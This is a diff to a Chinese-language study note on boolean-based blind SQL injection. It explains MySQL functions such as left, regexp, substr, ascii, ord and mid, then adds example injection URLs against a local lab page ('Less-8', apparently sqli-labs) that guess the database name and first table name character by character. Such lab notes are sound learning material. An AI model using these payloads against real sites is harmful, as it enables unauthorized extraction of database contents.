@@ -45,13 +45,23 @@ tags: web安全 sql注入 布尔盲注
 	left() left(database(),1)>'s'
 			database()显示数据库名称，left(a,b)从左侧截取a的前b位
 	regexp select user() regexp '^r'
-			正则表达式的用法user()结果位root_re
-
-
-
+			正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
+	like	select user() like 'ro%'
+			与regexp类似，使用like进行匹配
+	substr()  ascii(substr((select database()),1,1))=98
+	ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
+	ord()	ord(mid((select user()),1,1))=114
+	mid()	mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
 
 [MySql正则表达式](http://www.runoob.com/mysql/mysql-regexp.html)
 
+注入点： 
+
+	http://localhost:90/Less-8/?id=1'
+	http://localhost:90/Less-8/?id=1' and left((select database()),1)='a'--+
+	http://localhost:90/Less-8/?id=1' and left((select database()),1)='s'--+ 显示正确第一位为s
+
+	http://localhost:90/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e'--+ 第一个表名称字符
 
 
 
